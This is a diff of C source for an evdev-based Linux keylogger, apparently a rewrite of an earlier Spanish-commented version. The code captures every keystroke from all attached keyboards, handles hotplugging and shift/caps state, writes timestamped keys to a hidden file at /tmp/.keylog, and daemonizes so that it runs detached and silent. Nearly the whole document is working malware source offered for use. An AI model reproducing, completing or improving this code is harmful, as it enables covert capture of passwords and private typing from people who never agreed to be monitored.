@@ -1,3 +1,17 @@
+/*
+ * keylogger.c - Linux evdev-based keylogger
+ *
+ * Captures keystrokes directly from the kernel's input subsystem (evdev).
+ * Supports multiple keyboards, hotplug detection via inotify, and a
+ * configuration file. Runs as a daemon by default.
+ *
+ * Compile:  gcc -Wall -Wextra -O2 -pedantic -o keylogger keylogger.c -lrt
+ * Config:   /etc/keylogger.conf  or  ~/.keylogger.conf
+ *
+ * Licensed under GPLv3.
+ */
+
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -6,393 +20,648 @@
 #include <errno.h>
 #include <signal.h>
 #include <time.h>
-#include <sys/select.h>
+#include <poll.h>
+#include <sys/ioctl.h>
 #include <sys/stat.h>
 #include <sys/types.h>
+#include <sys/inotify.h>
 #include <linux/input.h>
-#include <linux/input-event-codes.h>  // para códigos KEY_*
+#include <linux/input-event-codes.h>
+#include <limits.h>
 
-// Archivo de log (ruta oculta en /tmp)
-#define LOG_FILE "/tmp/.keylog"
-// Tiempo de espera en select (microsegundos) para permitir manejo de señales
-#define SELECT_TIMEOUT_USEC 1000000
+// ---------------------------------------------------------------------------
+// Defaults
+// ---------------------------------------------------------------------------
+#define LOG_FILE_DEFAULT   "/tmp/.keylog"
+#define PID_FILE           "/tmp/keylogger.pid"
+#define CONF_FILE_SYSTEM   "/etc/keylogger.conf"
+#define CONF_FILE_USER     ".keylogger.conf"
+#define POLL_TIMEOUT_MS    1000
+#define MAX_KEYBOARDS      32
+#define KEY_MAP_SIZE       256
+#define CONF_LINE_MAX      512
+#define EVENT_BUF_LEN      64
+#define INOTIFY_BUF_LEN    (sizeof(struct inotify_event) + NAME_MAX + 1)
 
-// Variable global para indicar terminación
+// ---------------------------------------------------------------------------
+// Configuration (parsed from config file)
+// ---------------------------------------------------------------------------
+typedef struct {
+    char log_file[PATH_MAX];
+    int  foreground;
+    int  debug;
+} config_t;
+
+static config_t config = {
+    .log_file   = LOG_FILE_DEFAULT,
+    .foreground = 0,
+    .debug      = 0,
+};
+
+// ---------------------------------------------------------------------------
+// Global state
+// ---------------------------------------------------------------------------
 static volatile sig_atomic_t keep_running = 1;
 
-// Handler para SIGTERM y SIGINT
-void signal_handler(int sig) {
+// ---------------------------------------------------------------------------
+// Modifier state
+// ---------------------------------------------------------------------------
+static int shift_pressed = 0;
+static int ctrl_pressed  = 0;
+static int alt_pressed   = 0;
+static int caps_lock_on  = 0;
+
+// ---------------------------------------------------------------------------
+// Signal handler
+// ---------------------------------------------------------------------------
+static void signal_handler(int sig) {
     (void)sig;
     keep_running = 0;
 }
 
-// ------------------------------------------------------------
-// Tabla de mapeo de códigos KEY_* a caracteres ASCII (US QWERTY)
-// Los índices corresponden a los códigos del kernel (0-255)
-// Para teclas especiales se usa una cadena entre corchetes
-// ------------------------------------------------------------
-static const char *key_map[256] = {
-    [0] = "[RESERVED]",
-    [1] = "[ESC]",
-    [2] = "1",
-    [3] = "2",
-    [4] = "3",
-    [5] = "4",
-    [6] = "5",
-    [7] = "6",
-    [8] = "7",
-    [9] = "8",
-    [10] = "9",
-    [11] = "0",
-    [12] = "-",
-    [13] = "=",
-    [14] = "[BACKSPACE]",
-    [15] = "[TAB]",
-    [16] = "q",
-    [17] = "w",
-    [18] = "e",
-    [19] = "r",
-    [20] = "t",
-    [21] = "y",
-    [22] = "u",
-    [23] = "i",
-    [24] = "o",
-    [25] = "p",
-    [26] = "[",
-    [27] = "]",
-    [28] = "[ENTER]",
-    [29] = "[CTRL]",
-    [30] = "a",
-    [31] = "s",
-    [32] = "d",
-    [33] = "f",
-    [34] = "g",
-    [35] = "h",
-    [36] = "j",
-    [37] = "k",
-    [38] = "l",
-    [39] = ";",
-    [40] = "'",
-    [41] = "`",
-    [42] = "[SHIFT]",
-    [43] = "\\",
-    [44] = "z",
-    [45] = "x",
-    [46] = "c",
-    [47] = "v",
-    [48] = "b",
-    [49] = "n",
-    [50] = "m",
-    [51] = ",",
-    [52] = ".",
-    [53] = "/",
-    [54] = "[SHIFT]",
-    [55] = "[ASTERISK]",   // tecla *
-    [56] = "[ALT]",
-    [57] = "[SPACE]",
-    [58] = "[CAPSLOCK]",
-    [59] = "[F1]",
-    [60] = "[F2]",
-    [61] = "[F3]",
-    [62] = "[F4]",
-    [63] = "[F5]",
-    [64] = "[F6]",
-    [65] = "[F7]",
-    [66] = "[F8]",
-    [67] = "[F9]",
-    [68] = "[F10]",
-    [69] = "[NUMLOCK]",
-    [70] = "[SCROLLLOCK]",
-    [71] = "[HOME]",
-    [72] = "[UP]",
-    [73] = "[PAGEUP]",
-    [74] = "-",
-    [75] = "[LEFT]",
-    [76] = "[CENTER]",
-    [77] = "[RIGHT]",
-    [78] = "+",
-    [79] = "[END]",
-    [80] = "[DOWN]",
-    [81] = "[PAGEDOWN]",
-    [82] = "[INSERT]",
-    [83] = "[DELETE]",
-    [84] = "",
-    [85] = "",
-    [86] = "",
-    [87] = "[F11]",
-    [88] = "[F12]",
-    // ... se pueden añadir más códigos hasta 255
-    // Para teclas multimedia se pueden añadir cadenas descriptivas
+// ---------------------------------------------------------------------------
+// Key map (US QWERTY layout, extended to KEY_CNT)
+// ---------------------------------------------------------------------------
+static const char *key_map[KEY_MAP_SIZE] = {
+    [KEY_RESERVED]     = "[RESERVED]",
+    [KEY_ESC]          = "[ESC]",
+    [KEY_1]            = "1",            [KEY_2]  = "2",
+    [KEY_3]            = "3",            [KEY_4]  = "4",
+    [KEY_5]            = "5",            [KEY_6]  = "6",
+    [KEY_7]            = "7",            [KEY_8]  = "8",
+    [KEY_9]            = "9",            [KEY_0]  = "0",
+    [KEY_MINUS]        = "-",            [KEY_EQUAL]      = "=",
+    [KEY_BACKSPACE]    = "[BACKSPACE]",  [KEY_TAB]        = "[TAB]",
+    [KEY_Q]            = "q",            [KEY_W]          = "w",
+    [KEY_E]            = "e",            [KEY_R]          = "r",
+    [KEY_T]            = "t",            [KEY_Y]          = "y",
+    [KEY_U]            = "u",            [KEY_I]          = "i",
+    [KEY_O]            = "o",            [KEY_P]          = "p",
+    [KEY_LEFTBRACE]    = "[",            [KEY_RIGHTBRACE] = "]",
+    [KEY_ENTER]        = "[ENTER]",      [KEY_LEFTCTRL]   = "[CTRL]",
+    [KEY_A]            = "a",            [KEY_S]          = "s",
+    [KEY_D]            = "d",            [KEY_F]          = "f",
+    [KEY_G]            = "g",            [KEY_H]          = "h",
+    [KEY_J]            = "j",            [KEY_K]          = "k",
+    [KEY_L]            = "l",            [KEY_SEMICOLON]  = ";",
+    [KEY_APOSTROPHE]   = "'",            [KEY_GRAVE]      = "`",
+    [KEY_LEFTSHIFT]    = "[SHIFT]",      [KEY_BACKSLASH]  = "\\",
+    [KEY_Z]            = "z",            [KEY_X]          = "x",
+    [KEY_C]            = "c",            [KEY_V]          = "v",
+    [KEY_B]            = "b",            [KEY_N]          = "n",
+    [KEY_M]            = "m",            [KEY_COMMA]      = ",",
+    [KEY_DOT]          = ".",            [KEY_SLASH]      = "/",
+    [KEY_RIGHTSHIFT]   = "[SHIFT]",      [KEY_KPASTERISK] = "*",
+    [KEY_LEFTALT]      = "[ALT]",        [KEY_SPACE]      = "[SPACE]",
+    [KEY_CAPSLOCK]     = "[CAPSLOCK]",
+    [KEY_F1]           = "[F1]",         [KEY_F2]   = "[F2]",
+    [KEY_F3]           = "[F3]",         [KEY_F4]   = "[F4]",
+    [KEY_F5]           = "[F5]",         [KEY_F6]   = "[F6]",
+    [KEY_F7]           = "[F7]",         [KEY_F8]   = "[F8]",
+    [KEY_F9]           = "[F9]",         [KEY_F10]  = "[F10]",
+    [KEY_F11]          = "[F11]",        [KEY_F12]  = "[F12]",
+    [KEY_NUMLOCK]      = "[NUMLOCK]",
+    [KEY_SCROLLLOCK]   = "[SCROLLLOCK]",
+    [KEY_HOME]         = "[HOME]",       [KEY_UP]         = "[UP]",
+    [KEY_PAGEUP]       = "[PAGEUP]",     [KEY_KPMINUS]    = "-",
+    [KEY_LEFT]         = "[LEFT]",
+    [KEY_RIGHT]        = "[RIGHT]",      [KEY_KPPLUS]     = "+",
+    [KEY_END]          = "[END]",        [KEY_DOWN]       = "[DOWN]",
+    [KEY_PAGEDOWN]     = "[PAGEDOWN]",   [KEY_INSERT]     = "[INSERT]",
+    [KEY_DELETE]       = "[DELETE]",
+    [KEY_KP0]          = "0",            [KEY_KP1]  = "1",
+    [KEY_KP2]          = "2",            [KEY_KP3]  = "3",
+    [KEY_KP4]          = "4",            [KEY_KP5]  = "5",
+    [KEY_KP6]          = "6",            [KEY_KP7]  = "7",
+    [KEY_KP8]          = "8",            [KEY_KP9]  = "9",
+    [KEY_KPDOT]        = ".",            [KEY_KPSLASH]    = "/",
+    [KEY_KPENTER]      = "[ENTER]",
+    [KEY_LEFTMETA]     = "[META]",       [KEY_RIGHTMETA]  = "[META]",
+    [KEY_COMPOSE]      = "[COMPOSE]",
+    [KEY_PAUSE]        = "[PAUSE]",
+    [KEY_MENU]         = "[MENU]",
+    [KEY_SYSRQ]        = "[SYSRQ]",
+    [KEY_STOP]         = "[STOP]",
+    [KEY_AGAIN]        = "[AGAIN]",
+    [KEY_PROPS]        = "[PROPS]",
+    [KEY_UNDO]         = "[UNDO]",
+    [KEY_FRONT]        = "[FRONT]",
+    [KEY_COPY]         = "[COPY]",
+    [KEY_OPEN]         = "[OPEN]",
+    [KEY_PASTE]        = "[PASTE]",
+    [KEY_FIND]         = "[FIND]",
+    [KEY_CUT]          = "[CUT]",
+    [KEY_HELP]         = "[HELP]",
+    [KEY_KPEQUAL]      = "=",
+    [KEY_KPCOMMA]      = ",",
+    [KEY_F13]          = "[F13]",        [KEY_F14] = "[F14]",
+    [KEY_F15]          = "[F15]",        [KEY_F16] = "[F16]",
+    [KEY_F17]          = "[F17]",        [KEY_F18] = "[F18]",
+    [KEY_F19]          = "[F19]",        [KEY_F20] = "[F20]",
+    [KEY_F21]          = "[F21]",        [KEY_F22] = "[F22]",
+    [KEY_F23]          = "[F23]",        [KEY_F24] = "[F24]",
 };
 
-// Modificadores de mayúsculas (Shift, AltGr, Ctrl, CapsLock)
-static int shift_pressed = 0;
-static int ctrl_pressed = 0;
-static int alt_pressed = 0;
-static int caps_lock_on = 0;
-
-// Función para actualizar el estado de modificadores según el código y valor
-void update_modifiers(unsigned int code, int value) {
-    if (code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT) {
-        shift_pressed = (value == 1 || value == 2) ? 1 : 0;
-    } else if (code == KEY_LEFTCTRL || code == KEY_RIGHTCTRL) {
-        ctrl_pressed = (value == 1 || value == 2) ? 1 : 0;
-    } else if (code == KEY_LEFTALT || code == KEY_RIGHTALT) {
-        alt_pressed = (value == 1 || value == 2) ? 1 : 0;
-    } else if (code == KEY_CAPSLOCK) {
-        // CapsLock se activa/desactiva en el evento de presión (value=1)
-        if (value == 1)
-            caps_lock_on = !caps_lock_on;
+// ---------------------------------------------------------------------------
+// Shift-symbol mapping for US QWERTY
+// ---------------------------------------------------------------------------
+static const char *shift_symbol(unsigned int code) {
+    switch (code) {
+        case KEY_1:          return "!";
+        case KEY_2:          return "@";
+        case KEY_3:          return "#";
+        case KEY_4:          return "$";
+        case KEY_5:          return "%";
+        case KEY_6:          return "^";
+        case KEY_7:          return "&";
+        case KEY_8:          return "*";
+        case KEY_9:          return "(";
+        case KEY_0:          return ")";
+        case KEY_MINUS:      return "_";
+        case KEY_EQUAL:      return "+";
+        case KEY_GRAVE:      return "~";
+        case KEY_LEFTBRACE:  return "{";
+        case KEY_RIGHTBRACE: return "}";
+        case KEY_BACKSLASH:  return "|";
+        case KEY_SEMICOLON:  return ":";
+        case KEY_APOSTROPHE: return "\"";
+        case KEY_COMMA:      return "<";
+        case KEY_DOT:        return ">";
+        case KEY_SLASH:      return "?";
+        default:             return NULL;
     }
 }
 
-// Convertir una tecla a su representación de cadena, aplicando modificadores
-const char* key_to_string(unsigned int code, int value) {
-    // Solo procesamos eventos de presión (value=1) o repetición (value=2)
+// ---------------------------------------------------------------------------
+// Modifier updates
+// ---------------------------------------------------------------------------
+static void update_modifiers(unsigned int code, int value) {
+    int pressed = (value == 1 || value == 2);
+    switch (code) {
+        case KEY_LEFTSHIFT:  case KEY_RIGHTSHIFT: shift_pressed = pressed; break;
+        case KEY_LEFTCTRL:   case KEY_RIGHTCTRL:  ctrl_pressed  = pressed; break;
+        case KEY_LEFTALT:    case KEY_RIGHTALT:   alt_pressed   = pressed; break;
+        case KEY_CAPSLOCK:   if (value == 1) caps_lock_on = !caps_lock_on; break;
+    }
+}
+
+// ---------------------------------------------------------------------------
+// Key code to string conversion (thread-safe, uses caller buffer)
+// Returns string length or 0 if no output should be logged
+// ---------------------------------------------------------------------------
+static int key_to_string(unsigned int code, int value, char *out, size_t out_size) {
     if (value != 1 && value != 2)
-        return NULL;
-    
-    // Si es una tecla modificadora, actualizamos estado pero no devolvemos nada
-    if (code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT ||
-        code == KEY_LEFTCTRL || code == KEY_RIGHTCTRL ||
-        code == KEY_LEFTALT || code == KEY_RIGHTALT ||
-        code == KEY_CAPSLOCK) {
-        return NULL;
+        return 0;
+
+    switch (code) {
+        case KEY_LEFTSHIFT:  case KEY_RIGHTSHIFT:
+        case KEY_LEFTCTRL:   case KEY_RIGHTCTRL:
+        case KEY_LEFTALT:    case KEY_RIGHTALT:
+        case KEY_CAPSLOCK:
+            return 0;
     }
-    
-    const char *base = key_map[code];
-    if (!base || base[0] == '\0')
-        return "[UNKNOWN]";
-    
-    // Si la tecla es una letra (a-z), aplicamos mayúscula según shift y caps
+
+    // Letters with shift/caps (XOR: exactly one of them active)
     if (code >= KEY_A && code <= KEY_Z) {
-        int upper = (shift_pressed && !caps_lock_on) || (!shift_pressed && caps_lock_on);
-        // base apunta a minúscula, creamos una cadena estática para la mayúscula
-        static char upper_str[2];
-        if (upper) {
-            upper_str[0] = base[0] - 32; // convertir a mayúscula
-            upper_str[1] = '\0';
-            return upper_str;
-        } else {
-            return base;
-        }
+        int upper = shift_pressed ^ caps_lock_on;
+        const char *base = key_map[code];
+        if (!base || base[0] == '\0') return 0;
+        char c = base[0];
+        if (upper) c -= 32;
+        if (out_size < 2) return 0;
+        out[0] = c;
+        out[1] = '\0';
+        return 1;
     }
-    
-    // Para teclas de símbolos que dependen de Shift (1->!, 2->@, etc.)
-    // Mapeo específico para teclado US
+
+    // Shifted symbols
     if (shift_pressed) {
-        switch (code) {
-            case KEY_1: return "!";
-            case KEY_2: return "@";
-            case KEY_3: return "#";
-            case KEY_4: return "$";
-            case KEY_5: return "%";
-            case KEY_6: return "^";
-            case KEY_7: return "&";
-            case KEY_8: return "*";
-            case KEY_9: return "(";
-            case KEY_0: return ")";
-            case KEY_MINUS: return "_";
-            case KEY_EQUAL: return "+";
-            case KEY_GRAVE: return "~";
-            case KEY_LEFTBRACE: return "{";
-            case KEY_RIGHTBRACE: return "}";
-            case KEY_BACKSLASH: return "|";
-            case KEY_SEMICOLON: return ":";
-            case KEY_APOSTROPHE: return "\"";
-            case KEY_COMMA: return "<";
-            case KEY_DOT: return ">";
-            case KEY_SLASH: return "?";
-            default: break;
+        const char *sym = shift_symbol(code);
+        if (sym) {
+            size_t len = strlen(sym);
+            if (len < out_size) {
+                memcpy(out, sym, len + 1);
+                return (int)len;
+            }
+            return 0;
         }
     }
-    
-    // Para otras teclas (especiales) devolvemos la cadena base
-    return base;
+
+    // Base mapping (non-letter)
+    if (code < KEY_MAP_SIZE) {
+        const char *base = key_map[code];
+        if (base && base[0] != '\0') {
+            size_t len = strlen(base);
+            if (len < out_size) {
+                memcpy(out, base, len + 1);
+                return (int)len;
+            }
+            return 0;
+        }
+    }
+
+    // Fallback for unknown key codes
+    int n = snprintf(out, out_size, "[UNKNOWN:%u]", code);
+    return (n > 0 && (size_t)n < out_size) ? n : 0;
 }
 
-// Función para escribir en el log con timestamp
-void write_log(const char *str) {
-    if (!str) return;
-    FILE *fp = fopen(LOG_FILE, "a");
-    if (!fp) return;
-    
-    // Obtener timestamp
+// ---------------------------------------------------------------------------
+// Write a string to the log file (and stderr if in foreground with debug)
+// ---------------------------------------------------------------------------
+static void write_log(const char *str) {
+    if (!str || !*str) return;
+
     struct timespec ts;
     clock_gettime(CLOCK_REALTIME, &ts);
     struct tm tm;
     localtime_r(&ts.tv_sec, &tm);
     char timebuf[64];
     strftime(timebuf, sizeof(timebuf), "%Y-%m-%d %H:%M:%S", &tm);
-    fprintf(fp, "[%s.%06ld] %s\n", timebuf, ts.tv_nsec / 1000, str);
-    fflush(fp);
-    fclose(fp);
+
+    // Log to file
+    FILE *fp = fopen(config.log_file, "a");
+    if (fp) {
+        fprintf(fp, "[%s.%06ld] %s\n", timebuf, ts.tv_nsec / 1000, str);
+        fflush(fp);
+        fclose(fp);
+    }
+
+    // Debug output to stderr (foreground mode)
+    if (config.debug) {
+        fprintf(stderr, "[%s.%06ld] %s\n", timebuf, ts.tv_nsec / 1000, str);
+    }
 }
 
-// Buscar el primer dispositivo de teclado en /dev/input/event*
-int find_keyboard_device() {
-    int fd;
+// ---------------------------------------------------------------------------
+// Check if a device is a keyboard via ioctl
+// ---------------------------------------------------------------------------
+static int is_keyboard_device(int fd) {
+    unsigned long evbit[2] = {0};
+    if (ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), evbit) < 0)
+        return 0;
+    if (!(evbit[0] & (1 << EV_KEY)))
+        return 0;
+
+    unsigned long keybit[8] = {0};
+    if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keybit)), keybit) < 0)
+        return 0;
+    return (keybit[0] & (1 << KEY_A)) ? 1 : 0;
+}
+
+// ---------------------------------------------------------------------------
+// Try to open a keyboard by event device index
+// ---------------------------------------------------------------------------
+static int open_keyboard_by_index(int idx) {
     char path[64];
-    // Primero intentamos abrir event0, event1, ... hasta event15 (típico)
-    for (int i = 0; i < 32; i++) {
-        snprintf(path, sizeof(path), "/dev/input/event%d", i);
-        fd = open(path, O_RDONLY | O_NONBLOCK);
-        if (fd < 0) continue;
-        
-        // Verificar si soporta teclas (usando EVIOCGBIT)
-        unsigned long evbit[2] = {0, 0};
-        if (ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), evbit) < 0) {
-            close(fd);
-            continue;
-        }
-        // Verificar si el bit EV_KEY está activo
-        if (!(evbit[0] & (1 << EV_KEY))) {
-            close(fd);
-            continue;
-        }
-        
-        // Verificar si al menos soporta KEY_A (código 30)
-        unsigned long keybit[8] = {0};
-        if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keybit)), keybit) < 0) {
-            close(fd);
-            continue;
-        }
-        if (keybit[0] & (1 << KEY_A)) {
-            // Es un teclado válido
-            return fd;  // devolvemos descriptor abierto
-        }
+    snprintf(path, sizeof(path), "/dev/input/event%d", idx);
+    int fd = open(path, O_RDONLY | O_NONBLOCK);
+    if (fd < 0) return -1;
+    if (!is_keyboard_device(fd)) {
         close(fd);
+        return -1;
     }
-    return -1;
+    return fd;
 }
 
-// Función principal del keylogger (en modo demonio)
-void run_keylogger() {
-    int fd = find_keyboard_device();
-    if (fd < 0) {
-        // Intentar de nuevo en 5 segundos
-        while (keep_running && fd < 0) {
-            sleep(5);
-            fd = find_keyboard_device();
-        }
-        if (fd < 0) {
-            fprintf(stderr, "No se encontró ningún teclado.\n");
-            return;
+// ---------------------------------------------------------------------------
+// Scan all /dev/input/event* and return keyboard fds
+// ---------------------------------------------------------------------------
+static int scan_keyboards(int *fds, int max_count) {
+    int count = 0;
+    for (int i = 0; i < 32 && count < max_count; i++) {
+        int fd = open_keyboard_by_index(i);
+        if (fd >= 0) {
+            fds[count++] = fd;
+            if (config.debug)
+                fprintf(stderr, "[DEBUG] keyboard: /dev/input/event%d\n", i);
         }
     }
-    
+    return count;
+}
+
+// ---------------------------------------------------------------------------
+// Close all keyboard file descriptors
+// ---------------------------------------------------------------------------
+static void close_keyboards(int *fds, int count) {
+    for (int i = 0; i < count; i++) {
+        if (fds[i] >= 0) close(fds[i]);
+    }
+}
+
+// ---------------------------------------------------------------------------
+// Parse a single config line (key = value)
+// ---------------------------------------------------------------------------
+static void parse_config_line(const char *line) {
+    char buf[CONF_LINE_MAX];
+    size_t len = strlen(line);
+    if (len == 0 || len >= sizeof(buf)) return;
+    memcpy(buf, line, len + 1);
+
+    // Strip trailing newline/carriage return
+    while (len > 0 && (buf[len-1] == '\n' || buf[len-1] == '\r'))
+        buf[--len] = '\0';
+
+    // Skip empty lines and comments
+    char *p = buf;
+    while (*p == ' ' || *p == '\t') p++;
+    if (*p == '\0' || *p == '#' || *p == ';') return;
+
+    // Find = separator
+    char *eq = strchr(p, '=');
+    if (!eq) return;
+
+    // Key (trimmed)
+    *eq = '\0';
+    char *key = p;
+    char *end = key + strlen(key) - 1;
+    while (end > key && (*end == ' ' || *end == '\t')) *end-- = '\0';
+
+    // Value (trimmed)
+    char *val = eq + 1;
+    while (*val == ' ' || *val == '\t') val++;
+    end = val + strlen(val) - 1;
+    while (end > val && (*end == ' ' || *end == '\t')) *end-- = '\0';
+
+    // Strip optional quotes from value
+    if (val[0] == '"') {
+        size_t vlen = strlen(val);
+        if (vlen > 0 && val[vlen-1] == '"') {
+            val[vlen-1] = '\0';
+            val++;
+        }
+    }
+
+    if (strcmp(key, "log_file") == 0)
+        snprintf(config.log_file, sizeof(config.log_file), "%s", val);
+    else if (strcmp(key, "foreground") == 0)
+        config.foreground = (strcmp(val, "1") == 0 || strcmp(val, "yes") == 0 || strcmp(val, "true") == 0);
+    else if (strcmp(key, "debug") == 0)
+        config.debug = (strcmp(val, "1") == 0 || strcmp(val, "yes") == 0 || strcmp(val, "true") == 0);
+}
+
+// ---------------------------------------------------------------------------
+// Load configuration from a file
+// ---------------------------------------------------------------------------
+static void load_config(const char *path) {
+    FILE *fp = fopen(path, "r");
+    if (!fp) return;
+    char line[CONF_LINE_MAX];
+    while (fgets(line, sizeof(line), fp)) {
+        parse_config_line(line);
+    }
+    fclose(fp);
+    if (config.debug)
+        fprintf(stderr, "[DEBUG] config loaded: %s\n", path);
+}
+
+// ---------------------------------------------------------------------------
+// Initialize configuration from all known sources
+// ---------------------------------------------------------------------------
+static void init_config() {
+    char user_conf[PATH_MAX];
+    const char *home = getenv("HOME");
+    if (home) {
+        snprintf(user_conf, sizeof(user_conf), "%s/%s", home, CONF_FILE_USER);
+        load_config(user_conf);
+    }
+    load_config(CONF_FILE_SYSTEM);
+}
+
+// ---------------------------------------------------------------------------
+// Print usage
+// ---------------------------------------------------------------------------
+static void print_usage(const char *prog) {
+    fprintf(stderr, "Usage: %s [OPTIONS]\n", prog);
+    fprintf(stderr, "  -f, --foreground    Run in foreground (do not daemonize)\n");
+    fprintf(stderr, "  -d, --debug         Enable debug output (implies -f)\n");
+    fprintf(stderr, "  -c, --config FILE   Use alternative config file\n");
+    fprintf(stderr, "  -h, --help          Show this help\n");
+}
+
+// ---------------------------------------------------------------------------
+// Process event from a keyboard device
+// ---------------------------------------------------------------------------
+static void process_event(struct input_event *ev) {
+    if (ev->type != EV_KEY) return;
+    update_modifiers(ev->code, ev->value);
+    char buf[64];
+    if (key_to_string(ev->code, ev->value, buf, sizeof(buf))) {
+        write_log(buf);
+    }
+}
+
+// ---------------------------------------------------------------------------
+// Handle inotify event (new/removed devices in /dev/input)
+// ---------------------------------------------------------------------------
+static int handle_inotify(int inotify_fd, int *fds, int *count) {
+    char inotify_buf[INOTIFY_BUF_LEN];
+    ssize_t len = read(inotify_fd, inotify_buf, sizeof(inotify_buf));
+    if (len <= 0) return 0;
+
+    // Re-scan for keyboard devices
+    int new_count = scan_keyboards(fds, MAX_KEYBOARDS);
+    if (new_count > *count) {
+        if (config.debug)
+            fprintf(stderr, "[DEBUG] new keyboards found: %d\n", new_count - *count);
+    } else if (new_count < *count) {
+        if (config.debug)
+            fprintf(stderr, "[DEBUG] keyboards removed: %d\n", *count - new_count);
+    }
+    *count = new_count;
+    return new_count;
+}
+
+// ---------------------------------------------------------------------------
+// Main keylogger loop
+// ---------------------------------------------------------------------------
+static void run_keylogger() {
+    int fds[MAX_KEYBOARDS];
+    int keyboard_count = scan_keyboards(fds, MAX_KEYBOARDS);
+
+    if (keyboard_count == 0) {
+        fprintf(stderr, "No keyboard devices found. Waiting for hotplug...\n");
+    }
+
+    // Set up inotify on /dev/input
+    int inotify_fd = inotify_init1(IN_NONBLOCK);
+    int inotify_watch = -1;
+    if (inotify_fd >= 0) {
+        inotify_watch = inotify_add_watch(inotify_fd, "/dev/input",
+                                          IN_CREATE | IN_ATTRIB | IN_DELETE);
+        if (inotify_watch < 0 && config.debug)
+            fprintf(stderr, "[DEBUG] inotify watch on /dev/input failed: %s\n",
+                    strerror(errno));
+    }
+
     struct input_event ev;
-    fd_set readfds;
-    struct timeval tv;
-    int ret;
-    
+    struct pollfd *pfds = NULL;
+    int pfd_count = 0;
+    int pfd_capacity = 0;
+
     while (keep_running) {
-        FD_ZERO(&readfds);
-        FD_SET(fd, &readfds);
-        tv.tv_sec = 0;
-        tv.tv_usec = SELECT_TIMEOUT_USEC;
-        
-        ret = select(fd + 1, &readfds, NULL, NULL, &tv);
-        if (ret < 0) {
-            if (errno == EINTR) continue; // señal recibida
-            // Error en select, cerrar y reconectar
-            close(fd);
-            fd = find_keyboard_device();
-            if (fd < 0) {
-                sleep(5);
-                continue;
-            }
-            continue;
-        }
-        if (ret == 0) {
-            // Timeout, simplemente continuar para manejar señales
-            continue;
-        }
-        
-        // Leer eventos mientras haya datos
-        while (1) {
-            ret = read(fd, &ev, sizeof(ev));
-            if (ret < 0) {
-                if (errno == EAGAIN || errno == EWOULDBLOCK) break;
-                // Error de lectura, reconectar
-                close(fd);
-                fd = find_keyboard_device();
-                if (fd < 0) {
-                    sleep(5);
-                    continue;
-                }
+        // Build poll fd set: keyboard fds + inotify fd
+        int needed = keyboard_count + (inotify_watch >= 0 ? 1 : 0);
+        if (needed > pfd_capacity) {
+            free(pfds);
+            pfd_capacity = needed + 4;
+            pfds = malloc(sizeof(struct pollfd) * pfd_capacity);
+            if (!pfds) {
+                fprintf(stderr, "malloc failed\n");
                 break;
             }
-            if (ret != sizeof(ev)) continue;
-            
-            // Procesar evento
-            if (ev.type == EV_KEY) {
-                // Actualizar estado de modificadores
-                update_modifiers(ev.code, ev.value);
-                // Obtener representación de la tecla
-                const char *keystr = key_to_string(ev.code, ev.value);
-                if (keystr) {
-                    write_log(keystr);
+        }
+        pfd_count = 0;
+        for (int i = 0; i < keyboard_count; i++) {
+            pfds[pfd_count].fd = fds[i];
+            pfds[pfd_count].events = POLLIN;
+            pfd_count++;
+        }
+        if (inotify_watch >= 0) {
+            pfds[pfd_count].fd = inotify_fd;
+            pfds[pfd_count].events = POLLIN;
+            pfd_count++;
+        }
+
+        int ret = poll(pfds, pfd_count, POLL_TIMEOUT_MS);
+        if (ret < 0) {
+            if (errno == EINTR) continue;
+            fprintf(stderr, "poll error: %s\n", strerror(errno));
+            break;
+        }
+        if (ret == 0) continue;
+
+        // Check inotify for device changes
+        if (inotify_watch >= 0 && (pfds[pfd_count - 1].revents & POLLIN)) {
+            close_keyboards(fds, keyboard_count);
+            keyboard_count = scan_keyboards(fds, MAX_KEYBOARDS);
+            // Drain inotify events
+            handle_inotify(inotify_fd, fds, &keyboard_count);
+            continue;
+        }
+
+        // Read events from keyboard devices
+        for (int i = 0; i < keyboard_count; i++) {
+            if (!(pfds[i].revents & POLLIN)) continue;
+
+            while (1) {
+                ssize_t n = read(fds[i], &ev, sizeof(ev));
+                if (n < 0) {
+                    if (errno == EAGAIN || errno == EWOULDBLOCK) break;
+                    // Device error, close and try to reopen later
+                    close(fds[i]);
+                    fds[i] = -1;
+                    break;
                 }
+                if ((size_t)n != sizeof(ev)) continue;
+                process_event(&ev);
             }
         }
+
+        // Clean up dead fds and attempt reconnection
+        int dead_count = 0;
+        for (int i = 0; i < keyboard_count; i++) {
+            if (fds[i] < 0) {
+                dead_count++;
+                // Compact: shift remaining fds
+                for (int j = i; j < keyboard_count - 1; j++)
+                    fds[j] = fds[j + 1];
+                keyboard_count--;
+                i--;
+            }
+        }
+        // Re-scan for new keyboards if any died
+        if (dead_count > 0) {
+            int new_count = scan_keyboards(fds + keyboard_count,
+                                           MAX_KEYBOARDS - keyboard_count);
+            keyboard_count += new_count;
+        }
     }
-    
-    close(fd);
+
+    free(pfds);
+    close_keyboards(fds, keyboard_count);
+    if (inotify_watch >= 0) inotify_rm_watch(inotify_fd, inotify_watch);
+    if (inotify_fd >= 0) close(inotify_fd);
 }
 
-// Convertir en demonio (fork, etc.)
-void daemonize() {
+// ---------------------------------------------------------------------------
+// Daemonize (fork, detach from terminal)
+// ---------------------------------------------------------------------------
+static void daemonize() {
     pid_t pid = fork();
     if (pid < 0) {
         perror("fork");
         exit(EXIT_FAILURE);
     }
-    if (pid > 0) exit(EXIT_SUCCESS); // proceso padre termina
-    
-    // Crear nueva sesión
+    if (pid > 0) exit(EXIT_SUCCESS);
+
     if (setsid() < 0) {
         perror("setsid");
         exit(EXIT_FAILURE);
     }
-    
-    // Ignorar señal de control de terminal
+
     signal(SIGCHLD, SIG_IGN);
-    
-    // Segundo fork para asegurar que no sea líder de sesión
+
     pid = fork();
     if (pid < 0) {
         perror("fork2");
         exit(EXIT_FAILURE);
     }
     if (pid > 0) exit(EXIT_SUCCESS);
-    
-    // Cambiar directorio a root para no bloquear montajes
+
     chdir("/");
-    
-    // Cerrar descriptores estándar
+
     close(STDIN_FILENO);
     close(STDOUT_FILENO);
     close(STDERR_FILENO);
-    
-    // Redirigir a /dev/null
+
     open("/dev/null", O_RDWR);
     dup(0);
     dup(0);
 }
 
